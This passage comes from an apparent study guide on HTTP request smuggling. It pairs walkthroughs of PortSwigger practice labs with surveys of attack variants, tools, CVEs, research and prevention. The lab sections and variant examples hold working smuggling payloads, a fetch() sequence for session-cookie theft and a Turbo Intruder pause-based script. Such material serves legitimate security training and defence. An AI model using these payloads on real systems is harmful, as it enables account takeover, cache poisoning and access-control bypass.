**Phase 4-5:** Confirm tunnelling works by observing blog post response, then cache poison by removing extraneous path data.

**Phase 6-9:** Locate XSS gadget at `/resources`. Tunnel XSS payload with padding:
- **Payload:**
```
/?cachebuster=3 HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script>XXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1\r\n
Foo: bar
```

**Note:** Padding requirement—tunnelled response length must exceed main response's Content-Length.

**Phase 10-11:**
- Verify payload executes on victim visit
- Continuously resend without cachebuster to maintain poisoned cache
- Victim's browser loads home page with cached XSS

**Key Concepts:**
- `:path` pseudo-header injection in HTTP/2
- Request tunnelling via CRLF in pseudo-headers
- Cache poisoning through response length manipulation
- Padding ensures correct response alignment

---

### BROWSER-POWERED ATTACKS

#### Lab 18: Client-side desync

**URL:** https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync

**Difficulty:** EXPERT

**Description:**
Server ignores `Content-Length` headers on certain endpoints, enabling client-side desynchronization attacks.

**Objective:**
1. Identify client-side desync vector and replicate in browser
2. Find gadget for storing text data
3. Craft exploit causing victims' browsers to leak session cookies via cross-domain requests
4. Access victim's account using stolen cookie

**Solution Steps:**

**Phase 1: Identify Vulnerable Endpoint**
- Send `GET /` request to Burp Repeater
- Disable "Update Content-Length" in tab settings
- Convert to `POST` with `Content-Length: 1` and empty body
- Confirm server responds immediately without awaiting body content

**Phase 2: Confirm Desync Vector in Burp**
- Create malicious POST request with smuggled HTTP prefix
- Add normal follow-up request to same tab group
- Send requests sequentially on single connection (use "Send group in sequence (single connection)")
- Verify unexpected responses (like 404s) confirm successful smuggling

**Phase 3: Browser Replication via Fetch API**
Execute JavaScript in browser console:
```javascript
fetch('https://YOUR-LAB-ID.web-security-academy.net', {
  method: 'POST',
  body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
  mode: 'cors',
  credentials: 'include'
}).catch(() => {
  fetch('https://YOUR-LAB-ID.web-security-academy.net', {
    mode: 'no-cors',
    credentials: 'include'
  })
})
```

Intentionally triggers CORS errors to prevent redirect following while continuing attack sequence.

**Phase 4: Identify Exploitable Gadget**
Blog comment function serves as data exfiltration point:
- Requires `postId`, `csrf` token, session cookies
- Accepts arbitrary comment input
- Stores captured data publicly viewable

**Phase 5: Cookie Theft Attack**
Modify fetch payload to nest `POST /post/comment` request:
- Inject comment request with adjusted `Content-Length`
- Follow with dummy GET request
- Captured data includes victim's session cookie

Content-Length must:
- Exceed comment POST body length
- Remain shorter than follow-up request
- Capture cookie data in comment field

**Phase 6: Account Takeover**
Once cookie extracted from comment:
- Use stolen `session` cookie in `/my-account` request
- Verify successful authentication as victim

**Critical Parameters:**
- Connection header management: Switch between `keep-alive` and `close`
- CORS error exploitation: Use `.catch()` to continue attack flow
- Byte counting precision: Content-Length calibration determines captured data
- Credential inclusion: `credentials: 'include'` necessary for cookie transmission

**Testing Recommendations:**
- Test endpoints systematically for Content-Length handling
- Use separate Chrome instances not proxying through Burp
- Monitor Network tab with "Preserve log" enabled
- Adjust Content-Length incrementally for precision

---

#### Lab 19: CL.0 request smuggling

**URL:** https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling

**Difficulty:** EXPERT

**Description:**
Backend server ignores `Content-Length` header on requests to some endpoints.

**Objective:**
1. Identify vulnerable endpoint susceptible to CL.0 attacks
2. Smuggle request to reach `/admin` panel
3. Delete user "carlos"

**Solution Steps:**

**Phase 1: Endpoint Discovery**
Convert HTTP GET requests to POST methods and append smuggled request prefixes. Test various endpoints with modified `Content-Length` headers and observe response patterns.

Static resource paths (like `/resources/images/blog.svg`) identified as viable attack vectors.

**Phase 2: Exploitation**
Once vulnerable endpoint identified, craft POST request containing:
- Valid initial request targeting vulnerable endpoint
- Embedded GET request to `/admin`
- `Connection: keep-alive` header to maintain connection

**Working Payload Structure:**
```http
POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: localhost
```

Send in group with normal follow-up request.

**Phase 3: Delete User**
Modify smuggled request to deletion endpoint:
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

**Technical Implementation:**
CL.0 variant exploits servers that completely ignore Content-Length header on certain endpoints, treating all data after headers as part of next request.

**Burp Suite Features:**
- HTTP history review and request capture
- Repeater tool for sequential request transmission
- Group-based request sequencing with single connection mode
- Request method conversion utilities

---

#### Lab 20: Server-side pause-based request smuggling

**URL:** https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling

**Difficulty:** EXPERT

**Description:**
Front-end server streams requests to back-end without closing connections after timeout on certain endpoints, enabling pause-based request smuggling.

**Objective:**
Identify pause-based vulnerability, access admin panel, and delete user "carlos".

**Key Technical Details:**
- **Server:** Apache 2.4.52 (vulnerable to pause-based CL.0 attacks on redirect endpoints)
- **Vulnerable Endpoint:** Directories without trailing slashes triggering server-level redirects (e.g., `/resources` → `/resources/`)

**Solution Steps:**

**Phase 1: Identify Desync Vector**
1. Observe Apache version in response headers
2. Send GET request to `/resources` and confirm redirect behavior
3. Export request to Turbo Intruder extension
4. Convert to POST method and set `Connection: keep-alive`

**Phase 2: Construct Smuggling Payload**

**Base Request:**
```http
POST /resources HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

GET /admin/ HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

**Python Script for Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=500,
        pipeline=False
    )
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

**Key Parameter:** `pauseTime=61000` (milliseconds) allows back-end to hold connection open without timeout.

**Phase 3: Bypass Authentication**
Modify smuggled request Host header to `localhost` to bypass access controls restricting to local connections.

**Phase 4: Extract Admin Form Details**
From admin panel response, identify:
- Form action: `/admin/delete`
- Input field name: `username`
- CSRF token value

**Phase 5: Exploit Vulnerability**

**Final Payload:**
```http
POST /resources HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: [CORRECT]

csrf=[TOKEN]&username=carlos
```

**Updated Pause Marker:**
```python
pauseMarker=['Content-Length: CORRECT\r\n\r\n']
```

Ensures pausing occurs only after first set of headers, not both occurrences.

**Critical Timing:**
61-second pause exploits Apache's connection timeout behavior, forcing front-end to stream entire request body before closing connection, while back-end maintains connection longer.

---

## Attack Techniques and Methodology

### Understanding Attack Variants

#### CL.TE (Content-Length / Transfer-Encoding)

**Mechanism:**
- Front-end server uses Content-Length header
- Back-end server uses Transfer-Encoding header
- Both headers placed in same HTTP request
- Front-end uses CL and ignores TE
- Back-end ignores CL and uses TE

**Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Impact:**
- Request boundaries interpreted differently by each layer
- "SMUGGLED" text prepended to next user's request
- Can capture credentials, bypass security, poison cache

---

#### TE.CL (Transfer-Encoding / Content-Length)

**Mechanism:**
- Frontend recognizes Transfer-Encoding
- Backend does not use Transfer-Encoding
- Front-end uses TE header and ignores CL header
- Back-end uses CL header and ignores TE header

**Exploitation:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Impact:**
- Reverse of CL.TE attack
- Exploits opposite parsing behavior
- Same attack capabilities

---

#### TE.TE (Transfer-Encoding / Transfer-Encoding)

**Mechanism:**
- Both servers support Transfer-Encoding
- One server ignores header if syntax is malformed
- Header can be obfuscated (nonstandard whitespace, duplicate headers)
- Makes one server but not the other ignore it

**Obfuscation Techniques:**
```
Transfer-Encoding: chunked
Transfer-encoding: cow

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-encoding: identity
Transfer-encoding: chunked
```

**Impact:**
- More sophisticated attack requiring obfuscation
- Exploits RFC compliance inconsistencies
- Can bypass WAF protections

---

#### H2 Variants (HTTP/2 Downgrade Attacks)

**H2.CL Mechanism:**
- HTTP/2 request downgraded to HTTP/1.1
- Frontend handling HTTP/2 fails to properly sanitize during downgrade
- Content-Length processed incorrectly

**H2.TE Mechanism:**
- Similar to H2.CL but with Transfer-Encoding
- RFC 7540 violations in header handling
- Binary protocol characteristics create translation issues

**H2 Request Tunnelling:**
- CRLF injection in HTTP/2 header names
- Complete HTTP/1.1 requests injected via headers
- Bypasses front-end security entirely

**Impact:**
- Particularly dangerous for modern infrastructures
- Affects systems using HTTP/2 at edge with HTTP/1.1 backends
- Can bypass security controls at HTTP/2 layer

---

### Detection Techniques

#### Time-Based Detection

**Method:**
Send requests that will cause a time delay in the application's responses if a vulnerability is present.

**CL.TE Time-Based Test:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If vulnerable, application hangs for ~10 seconds waiting for more data.

**TE.CL Time-Based Test:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If vulnerable, application hangs waiting for Content-Length bytes.

---

#### Differential Response Detection

**Method:**
Trigger response differences based on the smuggled HTTP request.

**Example:**
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Send twice. If second request returns 404, vulnerability confirmed.

---

### Exploitation Patterns

#### Pattern 1: Bypass Front-End Security Controls

**Attack Goal:** Access restricted endpoints by smuggling requests that bypass front-end checks.

**Technique:**
1. Identify restricted resource (e.g., `/admin`)
2. Smuggle request with required headers (e.g., `Host: localhost`)
3. Front-end doesn't see restricted path
4. Back-end processes smuggled request with admin privileges

---

#### Pattern 2: Capture Sensitive Data

**Attack Goal:** Steal credentials, session tokens, or other sensitive data from other users.

**Technique:**
1. Identify endpoint that stores user input
2. Smuggle request with oversized Content-Length
3. Next user's request fills the gap
4. Captured data (including cookies) stored in attacker-controlled location

---

#### Pattern 3: Cache Poisoning

**Attack Goal:** Poison cache with malicious content affecting all users.

**Technique:**
1. Identify cacheable resource
2. Smuggle request causing redirect or error response
3. Malicious response cached under legitimate URL
4. All users receive poisoned response

---

#### Pattern 4: Reflected XSS Amplification

**Attack Goal:** Deliver XSS to other users via smuggled requests.

**Technique:**
1. Identify reflected input (e.g., User-Agent header)
2. Smuggle request with XSS payload in header
3. Next user receives response with XSS
4. XSS executes in victim's browser

---

### Common Pitfalls and Troubleshooting

#### Content-Length Calculation Errors

**Problem:** Manually calculating Content-Length is error-prone.

**Solution:**
- Use HTTP Request Smuggler extension
- Count every character including spaces and CRLF (`\r\n`)
- Remember: CRLF = 2 bytes, not 1

**Example:**
```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
```
Length = 24 (GET) + 2 (\r\n) + 15 (Host) + 2 (\r\n) + 2 (\r\n) = 45 bytes

---

#### Missing CRLF Sequences

**Problem:** Forgetting trailing CRLF sequences causes attacks to fail.

**Solution:**
- Always include `\r\n\r\n` after final chunk
- Use Shift+Return in Burp Inspector to insert CRLF
- Verify in hex view

---

#### Connection Resets

**Problem:** Backend connections reset after certain number of requests.

**Solution:**
- Send 10 normal requests to re-establish clean connection
- Start attack sequence again
- Monitor for connection reset indicators

---

#### Timing Issues

**Problem:** Victim users make intermittent requests.

**Solution:**
- Multiple attack attempts often necessary
- Wait appropriate time between attempts
- Use victim simulator timing information

---

## Tools and Frameworks

### Burp Suite

**Primary Tool:** Burp Suite Professional with extensions

**Key Features:**
- **Burp Repeater:** Request crafting and testing
- **Inspector Panel:** Protocol selection, header manipulation
- **Burp Intruder:** Automated payload testing
- **Turbo Intruder:** Timing attacks and pause-based techniques

**Essential Extension:**
- **HTTP Request Smuggler:** Automated detection and exploitation
  - Repository: https://github.com/PortSwigger/http-request-smuggler
  - Features: CL.TE, TE.CL, TE.TE, H2 downgrade detection

---

### Open Source Tools

#### 1. Smuggler (defparam)
**Description:** HTTP Request Smuggling testing tool written in Python 3.

**Features:**
- Multiple payload support
- Domain scanning capabilities
- CL.TE and TE.CL detection

**Repository:** https://github.com/defparam/smuggler

**Usage:**
```bash
python3 smuggler.py -u https://target.com
```

---

#### 2. http2smugl
**Description:** HTTP/2 request smuggling security testing tool.

**Features:**
- HTTP/2 specific testing
- Downgrade vulnerability detection
- Infrastructure validation

**Usage:**
Designed for AppSec, DevSecOps, and NOC teams to check their infrastructures.

---

#### 3. smuggles (danielthatcher)
**Description:** HTTP request smuggling scanner designed to work at scale.

**Features:**
- Scale-optimized design (thousands of hosts)
- CL.TE detection using time-based techniques
- TE.CL detection using time-based techniques

**Repository:** https://github.com/danielthatcher/smuggles

---

#### 4. request_smuggler (Sh1Yo)
**Description:** HTTP request smuggling vulnerability scanner based on James Kettle's research.

**Repository:** https://github.com/Sh1Yo/request_smuggler

---

#### 5. h2csmuggler
**Description:** HTTP Request Smuggling over HTTP/2 Cleartext (h2c) protocol.

**Use Case:** Testing h2c upgrade mechanisms

---

#### 6. http-desync-guardian (AWS)
**Description:** Tool by AWS to analyze HTTP requests to minimize risks of HTTP Desync attacks.

**Features:**
- Request analysis
- Risk minimization
- AWS-maintained

---

### Commercial Tools

#### Qualys WAS
**Description:** Web Application Scanning with HTTP Request Smuggling detection.

**Reference:** https://blog.qualys.com/product-tech/2020/10/02/detecting-http-request-smuggling-with-qualys-was

#### Tenable WAS
**Description:** Web Application Scanning with HTTP Request Smuggling detection.

**Reference:** https://www.tenable.com/plugins/was/114223

---

### Curated Resources

#### Awesome-HTTPRequestSmuggling
**Description:** Curated list of awesome blogs and tools about HTTP request smuggling attacks.

**Repository:** https://github.com/chenjj/Awesome-HTTPRequestSmuggling

**Content:**
- Comprehensive tool listings
- Research papers
- Blog posts
- Technical resources

---

## OWASP Guidelines

### Detection Methods

#### Automated Detection Tools
- **OWASP ZAP:** Can assist in automating detection of header mismatches
- **HTTP Request Smuggler:** Burp Suite extension for detecting parsing discrepancies

#### Time-Based Detection
The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present.

**Detection Mechanism:**
- For CL.TE variants, front-end uses Content-Length, forwards only part
- Back-end uses Transfer-Encoding, processes first chunk and waits
- Causes significant time delay indicating vulnerability

#### Differential Response Detection
Trigger response differences based on smuggled HTTP request.

**Confirmation Method:**
- Send "attack" request designed to interfere with next request
- If response contains expected interference, vulnerability confirmed
- Successful smuggler requests invalidate valid requests
- Endpoint returns 400 Bad Request with server-specific fingerprints

---

### Prevention and Remediation Strategies

#### Primary Recommendations

**1. Use HTTP/2 End-to-End**
- HTTP/2 uses robust mechanism for determining request length
- When used end to end, inherently protected against request smuggling
- Disable HTTP downgrading if possible

**2. Header Handling**
- Prioritize Transfer-Encoding header over Content-Length
- Prevent having both headers at same time
- Reject headers with unusual formats or unexpected variations
- Reject multiple Transfer-Encoding values
- Reject non-standard spelling of 'chunked'

**3. Connection Management**
- Back-end connections should not be reused
- Each back-end request should be made over distinct network connection
- Use HTTP/2 for back-end connections to eliminate ambiguity

**4. Server Consistency**
- Use same web server software for front-end and back-end servers
- Ensure servers agree on request bounds
- Harmonize technology stack to avoid parsing differences

**5. Input Validation**
- Validate all inputs for content and length
- Ensure malicious requests cannot be smuggled
- Implement strict HTTP parsing procedures

**6. Security Monitoring**
- Deploy WAFs with rules watching for strange traffic or odd headers
- Use intrusion detection tools to monitor unusual patterns
- Implement logging to catch out-of-sync requests

---

## CVE Examples and Real-World Exploitation

### Recent CVEs (2025)

#### CVE-2025-32094: Akamai HTTP Request Smuggling
**Details:**
- Discovered: March 2025
- Affected: Akamai platform
- Mechanism: HTTP/1.x OPTIONS request with Expect: 100-continue using obsolete line folding
- Impact: Discrepancy in how two in-path Akamai servers interpreted request
- Status: Quickly resolved platform-wide

**Reference:** https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling

---

#### CVE-2025-55315: .NET/ASP.NET Core Request Smuggling
**Details:**
- Released: October 14, 2025
- Affected: ASP.NET Core
- **CVSS Score: 9.9 out of 10 (Critical)**
- Description: Inconsistent interpretation of HTTP requests in ASP.NET Core
- Attack Vector: Authorized attacker can bypass security features over network
- Mechanism: Variation using Transfer-Encoding and Chunk Extensions

**Reference:** https://andrewlock.net/understanding-the-worst-dotnet-vulnerability-request-smuggling-and-cve-2025-55315/

---

### CVEs from 2023

#### CVE-2023-46747: F5 BIG-IP Request Smuggling
**Details:**
- Affected: F5 BIG-IP systems
- Related to: CVE-2022-26377
- Type: Request smuggling similar to Qlik RCE
- Impact: Allowed compromising F5 BIG-IP systems

**Reference:** https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/

---

#### CVE-2023-25690: Apache HTTP Server mod_proxy Request Smuggling
**Details:**
- Affected: Apache HTTP Server versions 2.4.0 - 2.4.55
- Component: mod_proxy configurations
- Mechanism: RewriteRule or ProxyPassMatch with non-specific patterns
- Attack: User-supplied request-target data re-inserted into proxied request

**Reference:** https://github.com/dhmosfunk/CVE-2023-25690-POC

---

### CVEs from 2022

#### CVE-2022-32214: Node.js llhttp Parser Request Smuggling
**Details:**
- Affected: Node.js http module
- Component: llhttp parser
- Issue: Does not strictly use CRLF sequence to delimit HTTP requests
- Impact: Leads to HTTP Request Smuggling

---

#### CVE-2022-26377: Apache HTTP Server mod_proxy_ajp
**Details:**
- Affected: Apache HTTP Server 2.4.53 and prior
- Component: mod_proxy_ajp
- Issue: Inconsistent interpretation of HTTP requests
- Impact: Allows attacker to smuggle requests to AJP server

---

### Real-World Impact Examples

#### Session Hijacking via HTTP/2 Downgrading
**Case Study:**
- Mechanism: Vulnerability enabled by HTTP/2 downgrading to HTTP/1.1
- Attack Chain: Response queue desynchronization
- Impact: Captured requests from legitimate users
- Result: Account takeover and sensitive information theft

**Reference:** https://outpost24.com/blog/request-smuggling-http-2-downgrading/

---

#### Cache Poisoning Leading to Mass Compromise
**Scenario:**
- Middleware cache servers targeted
- Faked responses stored on wrong cache entries
- All users received smuggled responses
- Led to credential harvesting at scale

---

### Historical Context

**Timeline:**
- **2005:** First surge following WatchFire's research (11 CVEs)
- **2005-2018:** Decline with mostly <5 CVEs annually
- **2019:** Renaissance with James Kettle's Black Hat presentation
- **2019-Present:** ~79% of all recorded request smuggling CVEs

**Bug Bounty Impact:**
- James Kettle 2019: Over $60,000 in bug bounties
- James Kettle 2025: Over $200,000 in two-week period
- Targets: Akamai, Cloudflare, Netlify, Apache, Varnish, Amazon

---

## Industry Standards

### MITRE Resources

#### CAPEC-33: HTTP Request Smuggling
**Description:** HTTP Request Smuggling documented in CAPEC (Common Attack Pattern Enumeration and Classification).

**Attack Pattern:**
- Request smuggling performed due to multiple interpretation error
- Target: Intermediary or monitor
- Method: Consistency manipulation (Transfer-Encoding and Content-Length headers)

**Reference:** https://capec.mitre.org/data/definitions/33.html

---

#### CWE-444: Inconsistent Interpretation of HTTP Requests
**Official Definition:** "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"

**Description:**
Product acts as intermediary HTTP agent (proxy or firewall) but does not interpret malformed HTTP requests/responses consistently with how messages will be processed by entities at ultimate destination.

**Attack Mechanism:**
Adversary abuses flexibility and discrepancies in parsing and interpretation of HTTP Request messages by different intermediary HTTP agents to split a single HTTP request into multiple unauthorized and malicious HTTP requests.

**Root Cause:**
Usually result of usage of outdated or incompatible HTTP protocol versions in HTTP agents.

**Potential Mitigations:**
- Use web server employing strict HTTP parsing (e.g., Apache)
- Use only SSL communication
- Terminate client session after each request
- Turn all pages to non-cacheable

**References:**
- https://cwe.mitre.org/data/definitions/444.html
- https://www.cvedetails.com/cwe-details/444/

---

### NIST References

#### National Vulnerability Database (NVD)
NIST maintains the NVD which catalogs HTTP request smuggling CVEs:
- https://nvd.nist.gov/vuln/detail/CVE-2020-7658
- https://nvd.nist.gov/vuln/detail/CVE-2024-23452
- https://nvd.nist.gov/vuln/detail/cve-2022-26377

---

### PCI DSS Requirements

**Note:** PCI DSS does not have explicit requirements mentioning "HTTP request smuggling" by name, but relevant requirements cover this vulnerability type.

#### Relevant PCI DSS Requirements

**Requirement 6.3.1: Vulnerability Management**
- Identification and management of vulnerabilities
- Impact on compliance programs

**Requirement 6.4.3: Payment Page Script Protection (v4.0)**
- Designed to prevent e-skimming
- All payment page scripts require authorization and integrity methods
- Effective: April 1, 2025

**Requirement 11.6.1: Tampering Detection (v4.0)**
- Detects tampering or unauthorized changes to payment page
- Must detect changes in HTTP headers and payment page content
- Effective: April 1, 2025

**Requirement 11.3.2: External Vulnerability Scanning**
- Quarterly external scans by Approved Scanning Vendor (ASV)
- Would detect HTTP request smuggling vulnerabilities

---

### RFC Standards and Protocol Analysis

#### Core RFC Violations

**RFC 9112 §2.2 – Message Parsing**
- Explicitly requires proper handling of carriage return characters
- If single CR received without LF: must be rejected or replaced with space
- Must process correctly before further parsing

**RFC 9112 Section 6.3.3: Transfer-Encoding vs Content-Length**
- If message received with both headers: Transfer-Encoding MUST override
- Having two competing indicators creates ambiguity
- **Problem:** Not all intermediaries apply this rule consistently

**RFC 7230 Section 3.3.3: Multiple Content-Length Headers**
- Strictly forbids double Content-Length headers
- If message received with multiple or invalid Content-Length:
  - Server MUST respond with 400 (Bad Request)
  - Close the connection

#### HTTP/2 Downgrade Issues

**RFC 7540 Requirements**
- If frontend handling HTTP/2 fails to remove Transfer-Encoding during downgrade
- Can result in H2.TE HTTP request smuggling flaw

**HTTP/2 Protocol Characteristics:**
- Binary protocol (not text-based like HTTP/1.1)
- Request headers don't have "\r\n" delimiter values
- Can contain newline characters in header names and values
- HTTP/2 → HTTP/1.1 conversions are high-risk areas

---

## Research Papers and Technical Articles

### Foundational Research

#### Original Discovery (2005)
**Title:** "HTTP Request Smuggling"
**Authors:** Chaim Linhart et al.
**Date:** 2005

**Significance:**
- First documented HTTP request smuggling vulnerability
- Established foundational concepts
- Request smuggling has been known since 2005

**Document:** https://trimstray.github.io/assets/pdfs/HTTP-Request-Smuggling.pdf

---

### James Kettle's Black Hat Research Series

#### 1. HTTP Desync Attacks: Smashing into the Cell Next Door (2019)
**Author:** James Kettle, Director of Research at PortSwigger
**Presented:** Black Hat USA 2019 & DEF CON 2019

**Key Achievements:**
- Explored techniques for remote, unauthenticated attackers to splice requests
- Compromised web infrastructure of numerous commercial and military systems
- Harvested over $60,000 in bug bounties

**Downloads:**
- White Paper: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf
- Presentation: https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf

---

#### 2. Browser-Powered Desync Attacks (2022)
**Author:** James Kettle
**Presented:** Black Hat USA 2022

**Key Innovations:**
- Demonstrated turning victim's web browsers into desync delivery platforms
- Combined cross-domain requests with server flaws to poison browser connection pools
- Compromised: Apache, Akamai, Varnish, Amazon, multiple web VPNs

**Downloads:**
- White Paper: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks-wp.pdf
- Presentation: https://i.blackhat.com/USA-22/Wednesday/us-22-Kettle-Browser-Powered-Desync-Attacks.pdf

---

#### 3. HTTP/1.1 Must Die: The Desync Endgame (2025)
**Author:** James Kettle
**Presented:** Black Hat USA 2025

**Key Achievements:**
- Introduced several novel classes of HTTP desync attack
- Capable of mass compromise of user credentials
- Exposed tens of millions of websites
- Subverted core infrastructure: Akamai, Cloudflare, Netlify
- Yielded over $200,000 in bug bounties in two-week period

**Downloads:**
- White Paper: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf
- Presentation: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-Wednesday.pdf

---

### Academic Publications

#### "Attacking Websites: Detecting and Preventing HTTP Request Smuggling Attacks" (2022)
**Authors:** Huang et al.
**Published:** Security and Communication Networks - Wiley Online Library

**Key Contributions:**
- New attack technique proposed at Black Hat 2019
- Changes structure of Transfer-Encoding in HTTP protocol
- Proposes Flask-based reverse proxy detection method

**Reference:** https://onlinelibrary.wiley.com/doi/10.1155/2022/3121177

---

#### "T-Reqs: HTTP Request Smuggling with Differential Fuzzing" (2021)
**Authors:** Bahruz Jabiyev et al.
**Published:** ACM SIGSAC Conference on Computer and Communications Security (CCS 2021)

**Key Innovations:**
- Differential fuzzing techniques for detecting HTTP request smuggling
- Novel automated detection methodology
- Advanced fuzzing approaches

**References:**
- https://dl.acm.org/doi/10.1145/3460120.3485384
- https://swsprec.com/papers/treqs.pdf

---

### Industry Technical Papers

#### "HTTP Request Smuggling in 2020 – New Variants, New Defenses and New Challenges"
**Author:** Amit Klein
**Presented:** Black Hat USA 2020

**Document:** https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges-wp.pdf

---

## Secure Coding and Prevention

### Prevention Techniques for Developers

#### 1. Protocol Upgrade Strategy

**Primary Recommendation: Use HTTP/2 End-to-End**
- HTTP/2 uses robust mechanism for determining request length
- When used end to end, inherently protected against request smuggling
- Disable HTTP downgrading if possible
- If HTTP downgrading unavoidable, validate rewritten request against HTTP/1.1 specification

---

#### 2. Strict HTTP Parsing

**Implement Strict HTTP Request Parsing**
- Use web servers with strict HTTP parsing enabled by default
- Prevent attackers from exploiting parsing vulnerabilities
- Reject malformed requests early in processing pipeline

**Best Practices:**
- Use Apache with strict parsing procedures
- Configure Nginx with rigorous request validation
- Implement custom middleware for additional validation layers

---

#### 3. Header Handling Best Practices

**Reject Ambiguous Requests**
- Reject ALL ambiguous requests
- Reject requests with both Content-Length AND Transfer-Encoding headers
- Reject requests with multiple Content-Length values
- Reject requests with multiple Transfer-Encoding values
- Reject non-standard 'chunked' encoding spellings

**Transfer-Encoding Priority**
- When both headers present: prioritize Transfer-Encoding over Content-Length
- Better: prevent having both headers at the same time
- Reject headers with unusual formats or unexpected variations

**Content-Length Validation**
- Use content-length headers to ensure correct request length interpretation
- Validate format and value
- Reject multiple or conflicting Content-Length headers

**Transfer-Encoding Guidelines**
- Avoid using chunked encoding unless necessary
- Use fixed-length encoding whenever possible
- If chunked encoding required, validate strictly per RFC specifications

---

#### 4. Connection Management

**Back-end Connection Handling**
- Back-end connections should NOT be reused
- Each back-end request should be made over distinct network connection
- Prevents request boundaries from becoming ambiguous
- Eliminates connection pooling risks

**For Back-end Connections:**
- Use HTTP/2 to eliminate ambiguity about request bounds
- If HTTP/1.1 required, implement strict connection lifecycle management
- Terminate connections after suspicious activity

---

#### 5. Input Validation Approaches

**Comprehensive Input Validation**
- Validate ALL inputs for content and length
- Ensure malicious requests cannot be smuggled into system
- Implement validation at multiple layers:
  - Edge/CDN layer
  - Load balancer layer
  - Web server layer
  - Application layer

**Validation Points:**
- Request method validation
- URI/URL validation
- Header name validation
- Header value validation
- Body size validation
- Character encoding validation

**Rejection Criteria:**
- Requests with unusual whitespace in headers
- Requests with non-standard line endings
- Requests with obsolete line folding
- Requests with control characters in headers
- Requests violating RFC specifications

---

### Configuration Best Practices

#### Server Hardening

**General Principles:**
- Keep servers updated with latest security patches
- Implement strict RFC compliance for HTTP/1.1 specifications
- Deploy defense-in-depth measures
- Regular security assessments

**Web Application Firewall (WAF) Configuration**
- Deploy WAFs configured to detect and block request smuggling attempts
- Enable protocol violation detection
- Configure custom rules for known attack patterns
- Monitor for strange traffic or odd headers

**WAF Rule Examples:**
- Block requests with both Content-Length and Transfer-Encoding
- Block requests with multiple Content-Length headers
- Block requests with obfuscated Transfer-Encoding values
- Block requests with non-standard chunked encoding

---

#### Nginx Configuration Best Practices

**Known Nginx Issues:**
- Nginx ignores headers like "Content-Length: 12 34" (reported as WONTFIX)
- Vulnerabilities with certain error_page configurations
- Risk when fronted by load balancer

**Hardening Recommendations:**
- Validate headers and implement appropriate timeout settings
- Review request handling configurations
- Strictly validate Content-Length and Transfer-Encoding headers
- Keep Nginx updated to latest stable version

---

#### Apache Configuration Best Practices

**Apache Advantages:**
- Employs strict HTTP parsing procedure
- Better default behavior for ambiguous requests

**Hardening Recommendations:**
- Keep Apache updated (CVE-2023-25690 affects versions 2.4.0-2.4.55)
- Review mod_proxy configurations carefully
- Avoid non-specific patterns in RewriteRule or ProxyPassMatch
- Strictly validate Content-Length and Transfer-Encoding headers

---

### Monitoring and Detection

**Security Monitoring Setup**
- Deploy WAFs with traffic monitoring
- Implement intrusion detection systems (IDS)
- Watch for strange traffic patterns
- Monitor for odd or malformed headers

**Logging Best Practices:**
- Log all requests with suspicious header combinations
- Log requests with parsing anomalies
- Catch out-of-sync requests
- Log unusual server behavior
- Implement centralized logging
- Set up alerting for suspicious patterns

**Indicators to Monitor:**
- Requests with both Content-Length and Transfer-Encoding
- Requests with multiple identical headers
- Requests with unusual header formatting
